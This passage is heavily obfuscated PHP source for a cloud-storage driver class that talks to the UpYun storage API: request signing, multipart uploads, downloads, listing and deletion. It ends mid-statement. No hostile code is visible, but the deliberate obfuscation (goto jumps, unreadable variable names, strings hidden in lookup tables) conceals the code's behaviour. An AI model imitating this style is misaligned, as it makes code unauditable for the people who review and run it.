<?php
 goto E„‚ñŠˆËï; bˆÊœ¹¹ìİ: define($_SERVER[”øäÃÍª][317], 3); define($_SERVER[”øäÃÍª][318], 1); define($_SERVER[”øäÃÍª][319], 0); goto D›š‚æà±Ä; fƒ‘ÇÕÓº: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\x3a\57\x2f\166\x30\56\141\160\x69\x2e\165\x70\x79\x75\x6e\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($œÁ•×ÌÔ) { parent::__construct(); $this->_init($œÁ•×ÌÔ); } public function _init($ÄÔø‡£) { $ë½ë­“Ì =& $_SERVER[”øäÃÍª]; foreach ($ÄÔø‡£ as $É¾¥ÎàÃ => $¤Í†³Ó) { if (isset($this->{$É¾¥ÎàÃ})) { $this->{$É¾¥ÎàÃ} = $¤Í†³Ó; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ë½ë­“Ì[1704] . LNG($ë½ë­“Ì[1627])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ñ£•¯è, $¸—ç¸æ½ = "\107\x45\124") { $Ùİ¿¹¶Õ =& $_SERVER[”øäÃÍª]; $‘ûû´ÀÀ = gmdate($Ùİ¿¹¶Õ[1656]); $§ï’Æğ = base64_encode(hash_hmac($Ùİ¿¹¶Õ[1705], "{$¸—ç¸æ½}\x26{$Ñ£•¯è}\46{$‘ûû´ÀÀ}", md5("{$this->userpass}"), !0)); $óÃ…Î©² = array("\101\165\x74\x68\x6f\x72\x69\172\141\x74\151\157\156\x3a\125\120\131\x55\116\40{$this->username}\x3a{$§ï’Æğ}", "\x44\141\164\x65\x3a{$‘ûû´ÀÀ}"); return $óÃ…Î©²; } public function ussRequest($†çâã°¶, $’æïÁã© = "\107\x45\x54", $Ù±°¦˜÷ = false, $›ŒÂ³×µ = false, $º–Ë„ÇŞ = false) { $âÔ¬×«¹ =& $_SERVER[”øäÃÍª]; $†çâã°¶ = trim($†çâã°¶, $âÔ¬×«¹[8]); $µÂğ¡ƒ¶ = "\57{$this->bucket}\x2f" . rawurlencode($†çâã°¶); $ŒæŠİ„Æ = $this->ussHeaders($µÂğ¡ƒ¶, $’æïÁã©); if ($›ŒÂ³×µ) { $ŒæŠİ„Æ = array_merge($ŒæŠİ„Æ, $›ŒÂ³×µ); } $Ğ¾æØ† = url_request($this->endpoint . $µÂğ¡ƒ¶, $’æïÁã©, $Ù±°¦˜÷, $ŒæŠİ„Æ, $º–Ë„ÇŞ); if (!$Ğ¾æØ†) { $©ŸøÄä = LNG($âÔ¬×«¹[1706]); $this->writeLog($©ŸøÄä); return array($âÔ¬×«¹[1355] => !1, $âÔ¬×«¹[1345] => $©ŸøÄä); } if (strtolower($’æïÁã©) == $âÔ¬×«¹[227] || in_array($Ğ¾æØ†[$âÔ¬×«¹[1355]], array($âÔ¬×«¹[261], $âÔ¬×«¹[1707]))) { $Ù±°¦˜÷ = $Ğ¾æØ†[$âÔ¬×«¹[1708]]; if (!$Ğ¾æØ†[$âÔ¬×«¹[859]]) { $Ù±°¦˜÷ = isset($Ù±°¦˜÷[0]) ? $Ù±°¦˜÷[0] : $âÔ¬×«¹[12]; } } else { $Ù±°¦˜÷ = json_decode($Ğ¾æØ†[$âÔ¬×«¹[1345]], !0); if (!$Ù±°¦˜÷) { $Ù±°¦˜÷ = $Ğ¾æØ†[$âÔ¬×«¹[1345]]; } else { if (!$Ğ¾æØ†[$âÔ¬×«¹[859]] && isset($Ù±°¦˜÷[$âÔ¬×«¹[1709]])) { $Ù±°¦˜÷ = $Ù±°¦˜÷[$âÔ¬×«¹[1709]]; } } } if (!$Ğ¾æØ†[$âÔ¬×«¹[859]]) { $this->writeLog($this->__errorMessage($Ù±°¦˜÷)); } return array($âÔ¬×«¹[1355] => $Ğ¾æØ†[$âÔ¬×«¹[859]], $âÔ¬×«¹[1345] => $Ù±°¦˜÷); } private function __errorMessage($å»ÑÔ©) { $„±äüÚÚ =& $_SERVER[”øäÃÍª]; if (!$å»ÑÔ©) { return $„±äüÚÚ[12]; } static $£ŞÜË = null; if (!$£ŞÜË) { $£ŞÜË = I18n::getType(); } if ($£ŞÜË != $„±äüÚÚ[1664]) { return $å»ÑÔ©; } $„¼Æö§¦ = array($„±äüÚÚ[1710] => $„±äüÚÚ[1711], $„±äüÚÚ[1712] => $„±äüÚÚ[1713], $„±äüÚÚ[1714] => $„±äüÚÚ[1713], $„±äüÚÚ[1715] => $„±äüÚÚ[1716], $„±äüÚÚ[1717] => $„±äüÚÚ[1718], $„±äüÚÚ[1719] => $„±äüÚÚ[1720], $„±äüÚÚ[1721] => $„±äüÚÚ[1722]); return isset($„¼Æö§¦[$å»ÑÔ©]) ? $„¼Æö§¦[$å»ÑÔ©] : $å»ÑÔ©; } public function mkfile($É²‹í·Ü, $ã±Îö·à = '', $¯ ò€Çª = REPEAT_RENAME) { if ($this->setContent($É²‹í·Ü, $ã±Îö·à)) { return $this->getPathOuter($É²‹í·Ü); } return !1; } public function mkdir($‡‡©Ò­÷, $×£æÕ”ø = REPEAT_SKIP) { $ÃÆªó¾ª =& $_SERVER[”øäÃÍª]; $á½Ç×é = trim($‡‡©Ò­÷, $ÃÆªó¾ª[8]); if ($this->_isFolder($á½Ç×é)) { return $this->getPathOuter($á½Ç×é); } $¸µœòàš = array($ÃÆªó¾ª[1723]); $Å®ĞéãÒ = $this->ussRequest($á½Ç×é, $ÃÆªó¾ª[288], !1, $¸µœòàš); return $Å®ĞéãÒ[$ÃÆªó¾ª[1355]] ? $this->getPathOuter($á½Ç×é) : !1; } public function copyFile($ñ›©Ñ‡, $±Ò”¯•) { $é©¤¹ºú =& $_SERVER[”øäÃÍª]; $³Ñ Ò·š = array($é©¤¹ºú[1724] . "\57{$this->bucket}\57{$ñ›©Ñ‡}", $é©¤¹ºú[1725]); $üş×Å¾¨ = $this->ussRequest($±Ò”¯•, $é©¤¹ºú[253], !1, $³Ñ Ò·š); return $üş×Å¾¨[$é©¤¹ºú[1355]] ? !0 : $this->getPathOuter($±Ò”¯•); } public function moveFile($´¯Êƒù, $ÜÎœŸŒ) { $“Ì¨ =& $_SERVER[”øäÃÍª]; $ÕáŒ±–ê = array($“Ì¨[1726] . "\57{$this->bucket}\x2f{$´¯Êƒù}", $“Ì¨[1725]); $×ùïÚÊ­ = $this->ussRequest($ÜÎœŸŒ, $“Ì¨[253], !1, $ÕáŒ±–ê); return $×ùïÚÊ­[$“Ì¨[1355]] ? !0 : $this->getPathOuter($ÜÎœŸŒ); } public function delFile($Ææó€öï) { $£°÷âÈÜ =& $_SERVER[”øäÃÍª]; $Í…º—î­ = $this->ussRequest($Ææó€öï, $£°÷âÈÜ[1727]); return $Í…º—î­[$£°÷âÈÜ[1355]] ? !0 : !1; } public function delFolder($Ş´¼Ïø) { $—Ùäı–ò =& $_SERVER[”øäÃÍª]; if (!$this->exist($Ş´¼Ïø)) { return !0; } $this->listItemCache = !1; $±ŒÕÉÉŞ = $‹À¥ƒì– = array(); $this->fileList($Ş´¼Ïø, $±ŒÕÉÉŞ, $‹À¥ƒì–, !0); $this->listItemCache = !0; foreach ($‹À¥ƒì– as $Û—‹ ÉÙ) { $—ö¢·æ = $this->ussRequest($Û—‹ ÉÙ[$—Ùäı–ò[32]], $—Ùäı–ò[1727]); if (!$—ö¢·æ[$—Ùäı–ò[1355]]) { return !1; } } usort($±ŒÕÉÉŞ, function ($—°ºÂƒ¿, $èñ’­¤Œ) { $ÁôÈø«ô =& $_SERVER[”øäÃÍª]; return substr_count($èñ’­¤Œ, $ÁôÈø«ô[8]) - substr_count($—°ºÂƒ¿, $ÁôÈø«ô[8]); }); foreach ($±ŒÕÉÉŞ as $¥÷Öíéš) { $—ö¢·æ = $this->ussRequest($¥÷Öíéš, $—Ùäı–ò[1727]); if (!$—ö¢·æ[$—Ùäı–ò[1355]]) { return !1; } } $—ö¢·æ = $this->ussRequest($Ş´¼Ïø, $—Ùäı–ò[1727]); return $—ö¢·æ[$—Ùäı–ò[1355]]; } public function rename($ãŠú¥õ‡, $û³÷’ùƒ) { if ($this->isFile($ãŠú¥õ‡)) { $û³÷’ùƒ = get_path_father($ãŠú¥õ‡) . $û³÷’ùƒ; return $this->moveFile($ãŠú¥õ‡, $û³÷’ùƒ); } return $this->renameObject($ãŠú¥õ‡, $û³÷’ùƒ); } public function fileInfo($Âû³£Üı, $¡ì†ªãˆ = false, $Êı¬È™× = array()) { $¿ñª®ƒ¼ =& $_SERVER[”øäÃÍª]; $»üü¨£÷ = array($¿ñª®ƒ¼[32] => $this->pathThis($Âû³£Üı), $¿ñª®ƒ¼[87] => $this->getPathOuter($¿ñª®ƒ¼[8] . $Âû³£Üı), $¿ñª®ƒ¼[33] => $¿ñª®ƒ¼[230], $¿ñª®ƒ¼[79] => isset($Êı¬È™×[$¿ñª®ƒ¼[79]]) ? $Êı¬È™×[$¿ñª®ƒ¼[79]] : 0, $¿ñª®ƒ¼[166] => $this->ext($Âû³£Üı)); if ($¡ì†ªãˆ) { return $»üü¨£÷; } $»üü¨£÷[$¿ñª®ƒ¼[231]] = $»üü¨£÷[$¿ñª®ƒ¼[88]] = 0; $»üü¨£÷[$¿ñª®ƒ¼[232]] = $»üü¨£÷[$¿ñª®ƒ¼[233]] = !0; if (empty($Êı¬È™×)) { $Êı¬È™× = $this->objectMeta($Âû³£Üı); if (!$Êı¬È™×) { return $»üü¨£÷; } } $»üü¨£÷[$¿ñª®ƒ¼[231]] = intval($Êı¬È™×[$¿ñª®ƒ¼[1728]]); $»üü¨£÷[$¿ñª®ƒ¼[88]] = intval($Êı¬È™×[$¿ñª®ƒ¼[1729]]); $»üü¨£÷[$¿ñª®ƒ¼[79]] = $Êı¬È™×[$¿ñª®ƒ¼[79]]; return $»üü¨£÷; } public function folderInfo($¥£—¤î«, $ôğ¬ = false) { $‹ÉÊñ¥Ê =& $_SERVER[”øäÃÍª]; $¥¤©¯ŸÍ = array($‹ÉÊñ¥Ê[32] => $this->pathThis($¥£—¤î«), $‹ÉÊñ¥Ê[87] => $this->getPathOuter($‹ÉÊñ¥Ê[8] . $¥£—¤î«), $‹ÉÊñ¥Ê[33] => $‹ÉÊñ¥Ê[78]); if ($ôğ¬) { return $¥¤©¯ŸÍ; } $¥¤©¯ŸÍ[$‹ÉÊñ¥Ê[231]] = $¥¤©¯ŸÍ[$‹ÉÊñ¥Ê[88]] = 0; $¥¤©¯ŸÍ[$‹ÉÊñ¥Ê[232]] = $¥¤©¯ŸÍ[$‹ÉÊñ¥Ê[233]] = !0; if (empty($¯è”ÖÖå)) { $¯è”ÖÖå = $this->objectMeta($¥£—¤î«); if (!$¯è”ÖÖå) { return $¥¤©¯ŸÍ; } } $¥¤©¯ŸÍ[$‹ÉÊñ¥Ê[231]] = intval($¯è”ÖÖå[$‹ÉÊñ¥Ê[1728]]); $¥¤©¯ŸÍ[$‹ÉÊñ¥Ê[88]] = intval($¯è”ÖÖå[$‹ÉÊñ¥Ê[1729]]); return $¥¤©¯ŸÍ; } private function listObjs($Ô ıî Í, $‹š±•“˜ = 0, $¶·Ã©ˆ = 1000) { $™¨×ºõî =& $_SERVER[”øäÃÍª]; $‡ÑŠÛúë = array($™¨×ºõî[1730], $™¨×ºõî[1731] . $¶·Ã©ˆ); if ($‹š±•“˜) { $‡ÑŠÛúë[] = $™¨×ºõî[1732] . $‹š±•“˜; } $»Ìüø™Â = $this->ussRequest($Ô ıî Í, $™¨×ºõî[1561], !1, $‡ÑŠÛúë); return !$»Ìüø™Â[$™¨×ºõî[1355]] ? !1 : $»Ìüø™Â[$™¨×ºõî[1345]]; } private function fileList($ ×äÕÉ, &$´ò•Â¸, &$ñ°•ƒ…œ, $‰¾éİäô = false) { $İ—ßÂÕƒ =& $_SERVER[”øäÃÍª]; $Û§…ÌİÚ = $İ—ßÂÕƒ[12]; $ö“¤§ªÅ = 1000; $ ‹ª°Ä = rtrim($ ×äÕÉ, $İ—ßÂÕƒ[8]) . $İ—ßÂÕƒ[8]; while (!0) { check_abort(); $ÄÃÑäÀæ = $this->listObjs($ ×äÕÉ, $Û§…ÌİÚ, $ö“¤§ªÅ); if (!$ÄÃÑäÀæ) { return !1; } $Û§…ÌİÚ = isset($ÄÃÑäÀæ[$İ—ßÂÕƒ[1733]]) ? $ÄÃÑäÀæ[$İ—ßÂÕƒ[1733]] : $İ—ßÂÕƒ[12]; $®Õåê¤É = isset($ÄÃÑäÀæ[$İ—ßÂÕƒ[1734]]) ? $ÄÃÑäÀæ[$İ—ßÂÕƒ[1734]] : array(); foreach ($®Õåê¤É as $ÄÑ—¿î) { $âÏ„ØÀ = $ÄÑ—¿î[$İ—ßÂÕƒ[33]] == $İ—ßÂÕƒ[78] ? !0 : !1; $õğ×ŸƒÈ = ltrim($ ‹ª°Ä . $ÄÑ—¿î[$İ—ßÂÕƒ[32]], $İ—ßÂÕƒ[8]) . ($âÏ„ØÀ ? $İ—ßÂÕƒ[8] : $İ—ßÂÕƒ[12]); $¼Í¨ÓğÉ = array($İ—ßÂÕƒ[32] => $õğ×ŸƒÈ, $İ—ßÂÕƒ[33] => $âÏ„ØÀ ? $İ—ßÂÕƒ[78] : $İ—ßÂÕƒ[230], $İ—ßÂÕƒ[79] => $ÄÑ—¿î[$İ—ßÂÕƒ[412]], $İ—ßÂÕƒ[1729] => $ÄÑ—¿î[$İ—ßÂÕƒ[1735]]); $this->cacheMethodInfoSet($õğ×ŸƒÈ, $âÏ„ØÀ, $¼Í¨ÓğÉ); if ($âÏ„ØÀ) { $´ò•Â¸[] = $õğ×ŸƒÈ; if ($‰¾éİäô) { $this->fileList($õğ×ŸƒÈ, $´ò•Â¸, $ñ°•ƒ…œ, $‰¾éİäô); } continue; } $ñ°•ƒ…œ[] = $¼Í¨ÓğÉ; } if (count($®Õåê¤É) < $ö“¤§ªÅ) { break; } } $this->cacheMethodInfoSet($ ×äÕÉ, !0); } public function listPath($ßÓ‚—±â, $Ë´¥ãİõ = false) { $Ú¹âáÓ– =& $_SERVER[”øäÃÍª]; $‡ˆÌµÜğ = $áàº¡ÏÖ = array(); $this->fileList($ßÓ‚—±â, $‡ˆÌµÜğ, $áàº¡ÏÖ); foreach ($‡ˆÌµÜğ as $™ª¼ÇŞ => $àÆ’‚§ù) { $‡ˆÌµÜğ[$™ª¼ÇŞ] = $this->folderInfo($àÆ’‚§ù, $Ë´¥ãİõ); } foreach ($áàº¡ÏÖ as $™ª¼ÇŞ => $àÆ’‚§ù) { $áàº¡ÏÖ[$™ª¼ÇŞ] = $this->fileInfo($àÆ’‚§ù[$Ú¹âáÓ–[32]], $Ë´¥ãİõ, $àÆ’‚§ù); } return array($Ú¹âáÓ–[85] => $‡ˆÌµÜğ, $Ú¹âáÓ–[86] => $áàº¡ÏÖ); } public function has($­˜Øá’Ê, $é„îÊ¹´ = false, $ñÁ»±ªš = true) { $¤—çÍ =& $_SERVER[”øäÃÍª]; $ÅĞ‰®Á’ = $¤—çÍ[12]; $Ğ÷„ÄÑ¢ = 500; $Ü…İ¦ªÕ = 0; $ù£­™Ì• = 0; $Ùü±Ç²ı = rtrim($­˜Øá’Ê, $¤—çÍ[8]) . $¤—çÍ[8]; while (!0) { check_abort(); $ÉôĞî§Ù = $this->listObjs($­˜Øá’Ê, $ÅĞ‰®Á’, $Ğ÷„ÄÑ¢); if (!$ÉôĞî§Ù) { return !1; } $ÅĞ‰®Á’ = isset($ÉôĞî§Ù[$¤—çÍ[1733]]) ? $ÉôĞî§Ù[$¤—çÍ[1733]] : $¤—çÍ[12]; $ÌïÇåÚô = isset($ÉôĞî§Ù[$¤—çÍ[1734]]) ? $ÉôĞî§Ù[$¤—çÍ[1734]] : array(); if (empty($ÌïÇåÚô)) { break; } $¡•µÀ¸µ = array_filter($ÌïÇåÚô, function ($¥¸Ø©Û¾) { $ÄÃÁæß =& $_SERVER[”øäÃÍª]; return $¥¸Ø©Û¾[$ÄÃÁæß[33]] == $ÄÃÁæß[78]; }); $ê…¯©ÓÖ = count($ÌïÇåÚô); $¡•µÀ¸µ = count($¡•µÀ¸µ); $úŒÚ¼¬ç = $ê…¯©ÓÖ - $¡•µÀ¸µ; if ($é„îÊ¹´) { $ù£­™Ì• += $¡•µÀ¸µ; $Ü…İ¦ªÕ += $úŒÚ¼¬ç; if ($ê…¯©ÓÖ < $Ğ÷„ÄÑ¢) { break; } continue; } if ($ñÁ»±ªš) { if ($úŒÚ¼¬ç) { return !0; } } else { if ($¡•µÀ¸µ) { return !0; } } if ($ê…¯©ÓÖ < $Ğ÷„ÄÑ¢) { break; } } if ($é„îÊ¹´) { return array($¤—çÍ[239] => $Ü…İ¦ªÕ, $¤—çÍ[240] => $ù£­™Ì•); } return !1; } public function listAll($€°™Ÿñ¦) { $ƒƒä†”Ë =& $_SERVER[”øäÃÍª]; $Üµˆ¹®± = $ì¼ûúŠ® = array(); $this->fileList($€°™Ÿñ¦, $Üµˆ¹®±, $ì¼ûúŠ®, !0); $á¥ÈÕ‚÷ = array_to_keyvalue($ì¼ûúŠ®, $ƒƒä†”Ë[32]); foreach ($Üµˆ¹®± as $óÔ·”ı) { if (is_string($óÔ·”ı)) { $á¥ÈÕ‚÷[$óÔ·”ı] = array($ƒƒä†”Ë[79] => 0); } } return $this->listAllFiles($€°™Ÿñ¦, $á¥ÈÕ‚÷); } public function canRead($å¶·¯¡) { return $this->exist($å¶·¯¡) ? !0 : !1; } public function canWrite($×š®§æç) { return $this->exist($×š®§æç) ? !0 : !1; } public function getContent($¯‘ÃñÖ) { return $this->fileSubstr($¯‘ÃñÖ, 0, -1); } public function setContent($ÆúÇÁ£, $¡ó±†®Ì = '') { $üé ‘ò¤ =& $_SERVER[”øäÃÍª]; if (!$¡ó±†®Ì) { $’Î”Ïş© = $this->ussRequest($ÆúÇÁ£, $üé ‘ò¤[288]); return $’Î”Ïş©[$üé ‘ò¤[1355]]; } $Ã–•‰Ë = $this->tempFile($this->pathThis($ÆúÇÁ£)); file_put_contents($Ã–•‰Ë, $¡ó±†®Ì); if ($this->upload($ÆúÇÁ£, $Ã–•‰Ë)) { $this->tempFileRemve($Ã–•‰Ë); return !0; } return !1; } public function fileSubstr($ñŞ¨š„, $èÅò›˜Ù, $íÚÄö‹) { $ºñªœÆÛ =& $_SERVER[”øäÃÍª]; if (!($Ô¡à¤Ø¢ = $this->link($ñŞ¨š„))) { return !1; } $¸ĞÕ’Ã = !1; if ($íÚÄö‹ > 0) { $¼Ûı‹Íæ = $èÅò›˜Ù + $íÚÄö‹ - 1; $¸ĞÕ’Ã = array($ºñªœÆÛ[1560] . $èÅò›˜Ù . $ºñªœÆÛ[476] . $¼Ûı‹Íæ); } $×¬Ã‘âÊ = url_request($Ô¡à¤Ø¢, $ºñªœÆÛ[1561], !1, $¸ĞÕ’Ã); return $×¬Ã‘âÊ[$ºñªœÆÛ[859]] ? $×¬Ã‘âÊ[$ºñªœÆÛ[1345]] : !1; } public function upload($àÅ§‚, $»Ó½˜ëõ, $ì£ŸúäÍ = false, $·èÈ¬ÆÜ = REPEAT_REPLACE) { $‚åÈ”íì =& $_SERVER[”øäÃÍª]; if (!$»Ó½˜ëõ || !@file_exists($»Ó½˜ëõ)) { return !1; } $É¨ºîƒ = IO::size($»Ó½˜ëõ); if ($É¨ºîƒ <= 1024 * 1024 * 200) { $ˆĞ¿Áí´ = array($‚åÈ”íì[1736] . $»Ó½˜ëõ); $ªµ²¤ùœ = $this->ussRequest($àÅ§‚, $‚åÈ”íì[253], $ˆĞ¿Áí´); return $ªµ²¤ùœ[$‚åÈ”íì[1355]] ? $this->getPathOuter($àÅ§‚) : !1; } $Î“©¹àÏ = 1024 * 1024 * 10; $Àç‘è”× = array($‚åÈ”íì[1737], $‚åÈ”íì[1738] . $É¨ºîƒ, $‚åÈ”íì[1739], $‚åÈ”íì[1740] . $Î“©¹àÏ); $ªµ²¤ùœ = $this->ussRequest($àÅ§‚, $‚åÈ”íì[253], !1, $Àç‘è”×); if (!$ªµ²¤ùœ[$‚åÈ”íì[1355]]) { return !1; } $èšøÅ–Û = $ªµ²¤ùœ[$‚åÈ”íì[1345]]; $Óßã–Âœ = 0; $—ìıå‘¿ = $èšøÅ–Û[$‚åÈ”íì[1741]]; $æ¿àèĞ¼ = fopen($»Ó½˜ëõ, $‚åÈ”íì[1621]); if (!$æ¿àèĞ¼) { return !1; } do { $ù÷ĞÂŠ = $èšøÅ–Û[$‚åÈ”íì[1742]]; fseek_64($æ¿àèĞ¼, $Óßã–Âœ); $ïÄˆ£¥ê = fread($æ¿àèĞ¼, $ù÷ĞÂŠ); $ß½ç‡¶Ö = 0; do { $ß½ç‡¶Ö++; $èšøÅ–Û = $this->uploadPart($àÅ§‚, $èšøÅ–Û, $ïÄˆ£¥ê); } while (!$èšøÅ–Û && $ß½ç‡¶Ö < 3); if (!$èšøÅ–Û) { return !1; } $—ìıå‘¿ = $èšøÅ–Û[$‚åÈ”íì[1741]]; $Óßã–Âœ += $ù÷ĞÂŠ; } while ($—ìıå‘¿ != -1); fclose($æ¿àèĞ¼); $Àç‘è”× = array($‚åÈ”íì[1743], $‚åÈ”íì[1744] . $èšøÅ–Û[$‚åÈ”íì[1745]], $‚åÈ”íì[1739]); $ªµ²¤ùœ = $this->ussRequest($àÅ§‚, $‚åÈ”íì[253], !1, $Àç‘è”×); return $ªµ²¤ùœ[$‚åÈ”íì[1355]] ? $this->getPathOuter($²İİÑ—‡) : !1; } private function uploadPart($²—Ş‰İí, $üÏ¢ø‘š, &$ÉÖÙ®°) { $ ñŠµØø =& $_SERVER[”øäÃÍª]; $Ö¡‡¿ì¥ = array($ ñŠµØø[1746], $ ñŠµØø[1744] . $üÏ¢ø‘š[$ ñŠµØø[1745]], $ ñŠµØø[1747] . $üÏ¢ø‘š[$ ñŠµØø[1741]], $ ñŠµØø[143] . $üÏ¢ø‘š[$ ñŠµØø[1742]]); $åÅ£ÚÓ› = $this->ussRequest($²—Ş‰İí, $ ñŠµØø[253], $ÉÖÙ®°, $Ö¡‡¿ì¥); return !$åÅ£ÚÓ›[$ ñŠµØø[1355]] ? $åÅ£ÚÓ›[$ ñŠµØø[1355]] : $åÅ£ÚÓ›[$ ñŠµØø[1345]]; } public function uploadFormData($¥¢šÒ×†, $¢ºÃ¼óĞ = 3600) { return $this->uploadPolicy($¥¢šÒ×†, $¢ºÃ¼óĞ); } public function uploadMultiData($”åï¦ã, $å‚½§  = 3600) { $â×”¬öŒ =& $_SERVER[”øäÃÍª]; $ÛÚ²š— = (int) $GLOBALS[$â×”¬öŒ[7]][$â×”¬öŒ[79]]; return $this->uploadPolicy($”åï¦ã, $å‚½§ , $ÛÚ²š—); } private function uploadPolicy($¯ˆâî¾, $ôÀ·¤ş = 3600, $ÖòÁÂèõ = 0) { $ò¢¯Ô‰ú =& $_SERVER[”øäÃÍª]; $¶…¯›§È = $ò¢¯Ô‰ú[8] . $this->bucket; $òÎĞ™£Ñ = gmdate($ò¢¯Ô‰ú[1656]); $µÂÄ•Ùæ = array($ò¢¯Ô‰ú[1748] => $this->bucket, $ò¢¯Ô‰ú[1749] => $¯ˆâî¾, $ò¢¯Ô‰ú[1750] => time() + $ôÀ·¤ş, $ò¢¯Ô‰ú[1751] => $òÎĞ™£Ñ); if ($ÖòÁÂèõ) { $µÂÄ•Ùæ[$ò¢¯Ô‰ú[1641]] = $ÖòÁÂèõ; } $æˆÇ‘—¥ = base64_encode(json_encode($µÂÄ•Ùæ)); $™ÌëËïê = base64_encode(hash_hmac($ò¢¯Ô‰ú[1705], "\x50\117\123\124\46{$¶…¯›§È}\x26{$òÎĞ™£Ñ}\46{$æˆÇ‘—¥}", md5("{$this->userpass}"), !0)); $Ø‚­ÆÉÁ = array($ò¢¯Ô‰ú[277] => $æˆÇ‘—¥, $ò¢¯Ô‰ú[1752] => "\x55\x50\x59\x55\116\40{$this->username}\x3a{$™ÌëËïê}", $ò¢¯Ô‰ú[206] => $this->endpoint . $¶…¯›§È); return $Ø‚­ÆÉÁ; } public function download($¾·¿”°Í, $àÆä¯Œ) { $…¿°’Ç = IO::getPathInner(IO::mkfile($àÆä¯Œ)); if (!($èÖ‡Ùñ£ = $this->link($¾·¿”°Í))) { return !1; } $ÛÃöÉÛæ = 0; $×µâÆ³ä = 1024 * 200; $¡¶É®Å­ = fopen($…¿°’Ç, $_SERVER[”øäÃÍª][1700]); while (!0) { $ˆêØöŒ• = $this->fileSubstr($¾·¿”°Í, $ÛÃöÉÛæ, $×µâÆ³ä); if ($ˆêØöŒ• === !1) { return !1; } fwrite($¡¶É®Å­, $ˆêØöŒ•); $ÛÃöÉÛæ += $×µâÆ³ä; if (strlen($ˆêØöŒ•) < $×µâÆ³ä) { break; } } fclose($¡¶É®Å­); return $àÆä¯Œ; } public function link($è–÷ó×Õ, $®£ ×Ô = array()) { $ó®îş¹Š =& $_SERVER[”øäÃÍª]; $è–÷ó×Õ = trim($è–÷ó×Õ, $ó®îş¹Š[8]); if (!empty($this->token)) { $Ê¾¥Ï÷¼ = strtotime(date($ó®îş¹Š[1753])); $Ã¾²¸Ø = substr(md5($this->token . $ó®îş¹Š[284] . $Ê¾¥Ï÷¼ . $ó®îş¹Š[1754] . $è–÷ó×Õ), 12, 8) . $Ê¾¥Ï÷¼; $®£ ×Ô[] = $ó®îş¹Š[1755] . $Ã¾²¸Ø; } $ô«íÌÜ = !empty($®£ ×Ô) ? $ó®îş¹Š[76] . implode($ó®îş¹Š[284], $®£ ×Ô) : $ó®îş¹Š[12]; return $this->getHost() . $ó®îş¹Š[8] . $this->pathEncode($è–÷ó×Õ) . $ô«íÌÜ; } public function fileOut($†Ïé‘Ï®, $¨‘£´ôú = false, $ûÚá¸Âä = false, $õšÒ§…Ï = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($†Ïé‘Ï®, $¨‘£´ôú, $ûÚá¸Âä, $õšÒ§…Ï); } if (!$ûÚá¸Âä) { $ûÚá¸Âä = $this->pathThis($†Ïé‘Ï®); } $°ò¨Õâû = $¨‘£´ôú ? array($_SERVER[”øäÃÍª][1756] . rawurlencode($ûÚá¸Âä)) : array(); $ ñ¨®ª´ = $this->link($†Ïé‘Ï®, $°ò¨Õâû); $this->fileOutLink($ ñ¨®ª´); } public function fileOutServer($›…©±È, $÷¬™ş = false, $÷ï„êèã = false, $ª‡úñ£ = '') { parent::fileOut($›…©±È, $÷¬™ş, $÷ï„êèã, $ª‡úñ£); } public function fileOutImage($  Ä©Â´, $ä¬‰ßÚ¥ = 250) { $¦ä¸ÀÅ = $this->link($  Ä©Â´ . $_SERVER[”øäÃÍª][1757] . $ä¬‰ßÚ¥); $this->fileOutLink($¦ä¸ÀÅ); } public function fileOutImageServer($âÖ¹ã×Û, $ìñ˜ë‚‰ = 250) { parent::fileOutImage($âÖ¹ã×Û, $ìñ˜ë‚‰); } public function hashMd5($àòÖ™ù×) { $Ûõ·Ğïó =& $_SERVER[”øäÃÍª]; $Èà€ºé³ = $this->_objectMeta($àòÖ™ù×); return isset($Èà€ºé³[$Ûõ·Ğïó[245]]) ? $Èà€ºé³[$Ûõ·Ğïó[245]] : !1; } public function size($¨»­»¨) { $ÈÔ¢Ñ©ƒ = $this->objectMeta($¨»­»¨); return $ÈÔ¢Ñ©ƒ ? $ÈÔ¢Ñ©ƒ[$_SERVER[”øäÃÍª][79]] : 0; } public function info($Ï°³«¸Ä) { if ($this->isFolder($Ï°³«¸Ä)) { return $this->folderInfo($Ï°³«¸Ä); } else { if ($this->isFile($Ï°³«¸Ä)) { return $this->fileInfo($Ï°³«¸Ä); } } return !1; } public function exist($ğÄ´æáâ) { return $this->isFile($ğÄ´æáâ) || $this->isFolder($ğÄ´æáâ); } public function isFile($‡ª…éò½) { return !$this->isFolder($‡ª…éò½) && $this->objectMeta($‡ª…éò½); } public function isFolder($Á¦ÀÙâû) { return $this->cacheMethod($_SERVER[”øäÃÍª][177], $Á¦ÀÙâû); } protected function objectMeta($ç’ôàø) { return $this->cacheMethod($_SERVER[”øäÃÍª][179], $ç’ôàø); } protected function _objectMeta($ªÈÃå) { $ƒ©ŠÖƒĞ =& $_SERVER[”øäÃÍª]; if ($ªÈÃå == $ƒ©ŠÖƒĞ[12] || $ªÈÃå == $ƒ©ŠÖƒĞ[8]) { return array(); } $õ”†æ£· = $this->ussRequest($ªÈÃå, $ƒ©ŠÖƒĞ[1758]); if (!$õ”†æ£·[$ƒ©ŠÖƒĞ[1355]]) { return null; } $‘È Éôà = isset($õ”†æ£·[$ƒ©ŠÖƒĞ[1345]]) ? $õ”†æ£·[$ƒ©ŠÖƒĞ[1345]] : array(); if (!isset($‘È Éôà[$ƒ©ŠÖƒĞ[1759]])) { return null; } $¡„ë„¥ = array($ƒ©ŠÖƒĞ[33] => isset($‘È Éôà[$ƒ©ŠÖƒĞ[1759]]) ? $‘È Éôà[$ƒ©ŠÖƒĞ[1759]] : null, $ƒ©ŠÖƒĞ[79] => isset($‘È Éôà[$ƒ©ŠÖƒĞ[1760]]) ? $‘È Éôà[$ƒ©ŠÖƒĞ[1760]] : null, $ƒ©ŠÖƒĞ[245] => isset($‘È Éôà[$ƒ©ŠÖƒĞ[1761]]) ? $‘È Éôà[$ƒ©ŠÖƒĞ[1761]] : null, $ƒ©ŠÖƒĞ[1728] => isset($‘È Éôà[$ƒ©ŠÖƒĞ[1762]]) ? $‘È Éôà[$ƒ©ŠÖƒĞ[1762]] : null); $¡„ë„¥[$ƒ©ŠÖƒĞ[1729]] = isset($‘È Éôà[$ƒ©ŠÖƒĞ[1763]]) 